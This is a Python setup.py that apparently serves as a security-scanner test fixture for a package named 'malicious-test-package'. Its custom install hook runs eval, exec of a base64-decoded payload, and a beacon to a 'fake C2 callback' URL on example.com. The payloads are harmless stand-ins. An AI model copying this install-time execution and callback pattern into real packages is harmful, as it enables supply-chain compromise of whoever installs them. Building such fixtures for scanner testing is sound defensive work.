"""Setup configuration for malicious-test-package.

WARNING: This file is a TEST FIXTURE containing intentionally suspicious code
patterns. It is designed to trigger security scanners. DO NOT EXECUTE.
"""
import base64
import urllib.request
from setuptools import setup
from setuptools.command.install import install


# Encoded payload — decodes to: print("package installed successfully")
ENCODED_PAYLOAD = "cHJpbnQoInBhY2thZ2UgaW5zdGFsbGVkIHN1Y2Nlc3NmdWxseSIp"

# Fake C2 callback URL (example.com is safe — RFC 2606 reserved domain)
CALLBACK_URL = "https://example.com/api/v1/callback?token=exfil_test"


class PostInstallCommand(install):
    """Custom install command that executes encoded payload at install time."""

    def run(self):
        install.run(self)

        # Trigger: eval() in install hook
        eval("__import__('os').getcwd()")

        # Trigger: exec() with base64-decoded payload
        decoded = base64.b64decode(ENCODED_PAYLOAD).decode("utf-8")
        exec(decoded)

        # Trigger: compile() with dynamically constructed code
        code = compile("x = 1 + 1", "<string>", "exec")
        exec(code)

        # Trigger: urllib network call during install
        try:
            urllib.request.urlopen(CALLBACK_URL, timeout=1)
        except Exception:
            pass


setup(
    name="malicious-test-package",
    version="0.1.0",
    cmdclass={
        "install": PostInstallCommand,
    },
)
